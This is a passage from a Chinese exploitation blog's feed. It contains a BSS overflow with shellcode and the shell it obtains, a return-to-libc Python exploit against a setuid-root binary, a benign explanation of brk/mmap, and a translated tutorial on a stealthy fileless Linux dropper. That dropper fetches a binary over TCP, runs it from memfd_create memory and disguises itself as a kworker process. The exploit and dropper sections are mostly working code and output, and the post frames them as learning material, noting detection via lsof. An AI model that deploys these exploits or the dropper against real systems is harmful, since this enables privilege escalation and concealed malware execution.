class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</span><br><span class="line">                                                          XQh//shh/bin��Q��S��̀</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</span><br><span class="line">SHELLCODE will be at 0xbffff206</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1260 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 6</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 1250 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</span><br><span class="line">[You have 1250 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0xbffff206</span><br><span class="line">id</span><br><span class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br></pre></td></tr></table></figure></li></ul><h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="noopener">github repo</a></p><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul><li>《Hacking the art of exploitation》0x342</li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>malloc的系统调用</title>
      <link href="/2018/03/18/malloc%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
      <url>/2018/03/18/malloc%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="noopener">brk</a>和<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="noopener">mmap</a>。<h4 id="prco-pid-maps文件"><a href="#prco-pid-maps文件" class="headerlink" title="/prco/$pid/maps文件"></a>/prco/$pid/maps文件</h4></li><li>先来简单看下这个文件，这个文件会显示整个进程的地址空间分布情况。<br><img src="/2018/03/18/malloc的系统调用/maps.png" alt=""><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4></li><li>brk从内核获取内存是通过增加程序中断地址方式的，开始于start_brk,结束于brk，初始的时候两者都指向的是同一个位置。</li><li>当ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的</li><li>当ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。<br><img src="/2018/03/18/malloc的系统调用/linuxFlexibleAddressSpaceLayout.png" alt=""><br>nice pic，a ha ：D</li><li>如上图虚拟内存地址空间分布图所示，start_brk即是堆空间的开始，brk即是堆空间的结束。</li><li><p>!注意，后面的测试均是关闭ASLR后测试输出，此外测试系统使用的是ubuntu14.04.1X64操作系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭ASLR的方法</span><br><span class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li><li><p>示例代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">/* sbrk and brk example */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        void *curr_brk, *tmp_brk = NULL;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</span><br><span class="line"></span><br><span class="line">        /* sbrk(0) gives current program break location */</span><br><span class="line">        tmp_brk = curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* brk(addr) increments/decrements program break location */</span><br><span class="line">        brk(curr_brk+4096);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(0);</span><br><span class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出分析：</p></li><li>在brk之前，我们可以看到进程中是没有堆块的，因此 start_brk=brk=end_data=0x602000<br><img src="/2018/03/18/malloc的系统调用/brkbefore.png" alt=""></li><li>当程序执行brk调用的时候，如下的输出，我们看到有了堆块,因此 start_brk=end_data=0x602000,此时</li><li>start_brk=end_data=0x602000</li><li>brk = 0x603000<br><img src="/2018/03/18/malloc的系统调用/brkafter.png" alt=""></li><li>解释一下新增加的一行：这里602000-603000就是动态分配的地址空间，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li><li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4></li><li><p>malloc使用<a href="https://elixir.bootlin.com/linux/v3.8/source/mm/mmap.c#L1285" target="_blank" rel="noopener">mmap</a>来创建一个私有的匿名映射块，私有的匿名映射块主要的目的就是分配新的内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">/* Private anonymous mapping example using mmap syscall */</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void static inline errExit(const char* msg)</span><br><span class="line">&#123;</span><br><span class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</span><br><span class="line">        exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">        int ret = -1;</span><br><span class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</span><br><span class="line">        printf(&quot;Before mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        char* addr = NULL;</span><br><span class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">        if (addr == MAP_FAILED)</span><br><span class="line">                errExit(&quot;mmap&quot;);</span><br><span class="line">        printf(&quot;After mmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        /* Unmap mapped region. */</span><br><span class="line">        ret = munmap(addr, (size_t)132*1024);</span><br><span class="line">        if(ret == -1)</span><br><span class="line">                errExit(&quot;munmap&quot;);</span><br><span class="line">        printf(&quot;After munmap\n&quot;);</span><br><span class="line">        getchar();</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出分析：</p></li><li>在使用mmap之前：我们注意下面的一个内存地址段<br><img src="/2018/03/18/malloc的系统调用/mmapbefore.png" alt=""></li><li>当我们通过mmap申请了132KB的空间的时候，看到如下图<br><img src="/2018/03/18/malloc的系统调用/mmapafter.png" alt=""><br>b7df0000-b7e12000 其中这段虚拟内存地址就包含了我们刚刚申请到132KB大小的地址空间</li><li>其中b7df0000-b7e12000 是这个块的地址范围，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li><li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.</li><li>当munmap之后，下面的输出我们可以看的到申请的内存被释放（变成原来的b7e11000-b7e12000），又交还给了操作系统。<br><img src="/2018/03/18/malloc的系统调用/aftermunmap.png" alt=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li><li>在64位上brk和32的结果是相同的，但是mmap的会有不同，原因暂时不明。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li><li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">Syscalls used by malloc.</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>通过return-to-libc绕过NX-bit</title>
      <link href="/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
      <url>/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li><li>本次的测试环境是ubuntu14.04（X86).</li><li>为了缓解攻击者的行为，专家们想出了一项缓解缓冲区溢出漏洞利用的措施叫做“NX Bit”.</li><li>什么是NX(No-eXecute) Bit，<a href="https://www.wikiwand.com/en/NX_bit" target="_blank" rel="noopener">wiki</a>,它是一项让某个特定区域的内存代码变得不可执行不可修改的技术，例如，数据区域、栈空间和堆空间是不可执行的，代码区是不可写入的。当NX bit开启的时候，我们之前的缓冲区溢出利用将会失败，因为我们之前的shellcode会被复制到栈中然后我们的返回地址会被指向我们的shellcode从而执行我们的shellcode，但是自从栈中的代码不可以执行之后，我们的exploit会失败，但是这种缓解措施并不是一劳永逸的，这篇文章就将介绍如何绕过NX Bit！<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> //vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line"> char buf[256]; /* [1] */ </span><br><span class="line"> strcpy(buf,argv[1]); /* [2] */</span><br><span class="line"> printf(&quot;%s\n&quot;,buf); /* [3] */</span><br><span class="line"> fflush(stdout);  /* [4] */</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">$gcc -g -fno-stack-protector -o vuln vuln.c</span><br><span class="line">$sudo chown root vuln</span><br><span class="line">$sudo chgrp root vuln</span><br><span class="line">$sudo chmod +s vuln</span><br></pre></td></tr></table></figure><ul><li>需要注意的是 当参数-z execstack 没有传入（默认没有）的时候，我们的NX bit是没有开起来的<br>我们可以通过readelf -l 命令来查看一下<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/readelf.png" alt=""></li><li>可以看到栈空间只有RW的标志而没有E的标志。<h4 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h4></li><li>攻击者可以使用“return-to-libc”的技巧来绕过NX bit，这里返回地址被一个特定的libc的函数地址所覆盖（而不是包含shellcode的栈空间地址），例如如果攻击者想要去得到一个shell，他可以使用system（）函数的地址去覆盖返回函数的地址，同时在栈中设置system需要的合适参数来供其成功的调用。</li><li><p>漏洞利用代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import struct</span><br><span class="line">from subprocess import call</span><br><span class="line"></span><br><span class="line">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it. </span><br><span class="line">#For example system address = libc base address + system offset</span><br><span class="line">#where </span><br><span class="line">       #libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)</span><br><span class="line">       #system offset     = 0x0003f060 (obtained from &quot;readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system&quot;)</span><br><span class="line"></span><br><span class="line">system = 0xb7e52310       #0xb7e2000+0x0003f060</span><br><span class="line">exit = 0xb7e45260          #0xb7e2000+0x00032be0</span><br><span class="line"></span><br><span class="line">#system_arg points to &apos;sh&apos; substring of &apos;fflush&apos; string. </span><br><span class="line">#To spawn a shell, system argument should be &apos;sh&apos; and hence this is the reason for adding line [4] in vuln.c. </span><br><span class="line">#But incase there is0xb754b260 no &apos;sh&apos; in vulnerable binary, we can take the other approach of pushing &apos;sh&apos; string at the end of user input!!</span><br><span class="line">system_arg = 0xb7ffee11     #(obtained from hexdump output of the binary)</span><br><span class="line"></span><br><span class="line">#endianess conversion</span><br><span class="line">def conv(num):</span><br><span class="line"> return struct.pack(&quot;&lt;I&quot;,num)</span><br><span class="line">buf = &quot;A&quot; * 268</span><br><span class="line">buf += conv(system)</span><br><span class="line">buf += conv(exit)</span><br><span class="line">buf += conv(system_arg)</span><br><span class="line"></span><br><span class="line">print &quot;Calling vulnerable program&quot;</span><br><span class="line">call([&quot;./vuln&quot;, buf])</span><br></pre></td></tr></table></figure></li><li><p>关于system和exit以及sh的查找可以使用如下的方法<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/findaddr.png" alt=""></p></li><li>最后执行上面的利用代码可以得到我们想要的shell，如下图<br><img src="/2018/02/26/通过return-to-libc绕过NX-bit/exp.png" alt=""><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/" target="_blank" rel="noopener">Bypassing NX bit using return-to-libc</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>linux一种无文件后门技巧(译文)</title>
      <link href="/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7(%E8%AF%91%E6%96%87)/"/>
      <url>/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8A%80%E5%B7%A7(%E8%AF%91%E6%96%87)/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原文链接：&lt;https://0x00sec.org/t/super-stealthy-droppers/3715&gt;</span><br></pre></td></tr></table></figure><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li><p>几周之前我看了这篇<a href="https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html" target="_blank" rel="noopener">文章</a>,介绍的是不使用ptrace来进行linux进程注入的(使用ptrace进行进程注入的文章可以看向这里<a href="https://kevien.github.io/2018/01/28/linux进程注入/">linux进程注入</a>)，这篇文章很有意思建议你读一下，但引起我关注是的文末的一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The current payload in use is a simple open/memfd_create/sendfile/fexecve program</span><br></pre></td></tr></table></figure></li><li><p>我之前没有听过memfd_create和fexecve…就是这里引发了我的好奇，我决定学习和研究一下。</p></li><li>这篇文章我们将要讨论一下怎么利用这两个函数来开发一个超级隐蔽的dropper，你可以认为这是一个恶意软件开发的教程，但是开发和发布恶意软件是违法的：），此文仅做教学使用，因为最终恶意软件分析师需要去了解恶意软件开发者是怎么利用的，好让我们能更好的去检测它，从而使我们系统更加的安全。<h4 id="memfd-create-和-fexecve"><a href="#memfd-create-和-fexecve" class="headerlink" title="memfd_create 和 fexecve"></a>memfd_create 和 fexecve</h4></li><li>当读完这句有意思的话之后，我google了这两个函数，我发现功能确实强大，第一个允许我们在内存中创建一个文件，我们之前讨论过这个<a href="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" target="_blank" rel="noopener">话题</a>,之前我们是使用/dev/shm来存放的文件，这个文件夹存放在内存中，我们写在这里的东西都不会保存到硬盘上，然而，我们还是可以通过ls看到它。</li><li>memfd_create 能做同样的事情，但是它在内存中的存储并不会被映射到文件系统中，因此不能简单的通过ls命令进行查看。</li><li>第二个函数，fexecve同样的功能很强大，它能使我们执行一个程序（同execve），但是传递给这个函数的是文件描述符，而不是文件的绝对路径，也就是说搭配起来memfd_create使用简直完美！</li><li>但是这里有一个需要注意的地方就是，因为这两个函数相对的比较新，memfd_create 是在kernel3.17才被引进来，fexecve是libc的一个函数，是在版本2.3.2之后才有的，当然没有fexecve的时候，我们也可以使用其它方式去取代它（后面会讨论），而memfd_create只能用在相对较新的linux内核系统上。</li><li>这意味着至少在现在，这个技巧在一些运行着老内核和没有libc的嵌入式设备上是不可行的，我没有测试一些路由器和安卓设备上是否存在fexecve函数，我觉得是没有的，如有人知道，请在评论处告知；）<h4 id="一个简单的dropper"><a href="#一个简单的dropper" class="headerlink" title="一个简单的dropper"></a>一个简单的dropper</h4></li><li>为了了解这两个函数是怎么工作的，我写了一个简单的dropper，这个dropper可以下载远程服务器上的二进制文件并且直接在内存中运行，不会存储在磁盘上。</li><li>在这之前，我们先来看看之前文章中讨论过的<a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966" target="_blank" rel="noopener">Hajime</a>这个例子,这个例子使用了一行shell命令来创建一个文件（‘继承‘了另外一个文件的可执行权限）并且执行它然后再删除它。如果你不想打开链接，我之前把这行shell搬过来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .s .i; &gt;.i; ./.s&gt;.i; ./.i; rm .s; /bin/busybox ECCHI</span><br></pre></td></tr></table></figure></li></ul><p>我们将要创建一个新的.s,一旦执行，将会达到执行类型上面一行shell同样的效果。</p><ul><li><p>让我们先来看一下这个代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line"></span><br><span class="line">#define __NR_memfd_create 319</span><br><span class="line">#define MFD_CLOEXEC 1</span><br><span class="line"></span><br><span class="line">static inline int memfd_create(const char *name, unsigned int flags) &#123;</span><br><span class="line">    return syscall(__NR_memfd_create, name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern char        **environ;</span><br><span class="line"></span><br><span class="line">int main (int argc, char **argv) &#123;</span><br><span class="line">  int                fd, s;</span><br><span class="line">  unsigned long      addr = 0x0100007f11110002;</span><br><span class="line">  char               *args[2]= &#123;&quot;[kworker/u!0]&quot;, NULL&#125;;</span><br><span class="line">  char               buf[1024];</span><br><span class="line"></span><br><span class="line">  // Connect</span><br><span class="line">  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) exit (1);</span><br><span class="line">  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0) exit (1);</span><br><span class="line">  if ((fd = memfd_create(&quot;a&quot;, MFD_CLOEXEC)) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  while (1) &#123;</span><br><span class="line">      if ((read (s, buf, 1024) ) &lt;= 0) break;</span><br><span class="line">      write (fd, buf, 1024);</span><br><span class="line">    &#125;</span><br><span class="line">  close (s);</span><br><span class="line">  </span><br><span class="line">  if (fexecve (fd, args, environ) &lt; 0) exit (1);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码很短也很简单，但是这里有几个点需要稍微介绍一下。</p><h4 id="调用memfd-create"><a href="#调用memfd-create" class="headerlink" title="调用memfd_create"></a>调用memfd_create</h4></li><li>第一个要介绍的就是，libc并没有对memfd_create这个系统调用进行封装（你可以在这里看到这个系统调用的相关信息<a href="http://man7.org/linux/man-pages/man2/memfd_create.2.html#NOTES" target="_blank" rel="noopener">memfd_create manpage’s NOTES section</a>）,这就意味着我们需要自己去封装一下。</li><li>首先我们需要找到memfd_create在系统调用中的索引，通过一些在线的系统调用表，这个索引在不同的架构下是不同的，如果你想将上面的代码应用在ARM和MIPS上,可能需要不同的索引，在X86_64系统架构下的索引是319.</li><li>我使用了libc的syscall去对memfd_create进行了简单封装。</li><li>这个程序主要做了下面的事情</li><li>1.创建了一个TCP socket</li><li><p>2，使用AF_INET连接了127.0.0.1的0x1111端口，我们可以把这些所有的打包到一个变量里面这样可以使我们的代码看起来更短一点儿，同样你也可以去修改成你想要的ip和端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = 01 00 00  7f   1111  0002;</span><br><span class="line">        1. 0. 0.127   1111  0002;</span><br><span class="line">       +------------+------+----</span><br><span class="line">         IP Address | Port | Family</span><br></pre></td></tr></table></figure></li><li><p>3.创建一个内存文件</p></li><li>4.从socket读取数据写入到内存文件</li><li>5.一旦文件传输完毕，运行内存文件</li><li>是不是很简单粗暴；）<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4></li><li>现在，让我们来测试一下，通过main函数里面那个long的变量我们知道，这个dropper将会去连接本地localhost(127.0.0.1)的0x1111端口，这里我们简单的使用nc模拟一个server。</li><li><p>在控制台我们运行下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /usr/bin/xeyes | nc -l $((0x1111))</span><br></pre></td></tr></table></figure></li><li><p>你可以选择任意你喜欢的二进制文件，我这里用的是xeyes（一个小眼睛会跟踪鼠标的移动）这个linux自带的小程序。在另外的一个命令行界面我们运行我们的dropper，这个时候xeyes会弹出来。<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/xeye.png" alt=""></p><h4 id="检测这个dropper"><a href="#检测这个dropper" class="headerlink" title="检测这个dropper"></a>检测这个dropper</h4></li><li><p>查找这个进程比较困难，因为我们给这个进程起了一个kworker/u!0这样的名字，注意！在这里只是为了快速的去发现它，当然在实际情况中，你可以使用一个具有迷惑性的名字，比如说什么so的进程名来让它看起来像是个内核的合法进程，让我们来看一下ps的输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ps axe</span><br><span class="line">(...)</span><br><span class="line"> 2126 ?        S      0:00 [kworker/0:0]</span><br><span class="line"> 2214 pts/0    S+     0:00 [kworker/u!0]</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure></li><li><p>你可以看到上面的一行中是一个合法的kworker进程，下面的就是我们的看似合法的进程。</p><h4 id="看不见的文件"><a href="#看不见的文件" class="headerlink" title="看不见的文件"></a>看不见的文件</h4></li><li>我们之前提到的memfd_create 将会在RAM文件系统中创建文件且不会映射到一般的文件系统，至少，如果映射了，我是没找到，所以现在看来这的确是相当隐蔽的。</li><li>然而，事实上，如果一个文件存在，那么我们还是可以去发现它的，谁会去调用这个文件呢，没错，我们可以通过lsof(list of file)去查找：）到它<br><img src="/2018/02/20/linux一种无文件后门技巧(译文)/lsof.png" 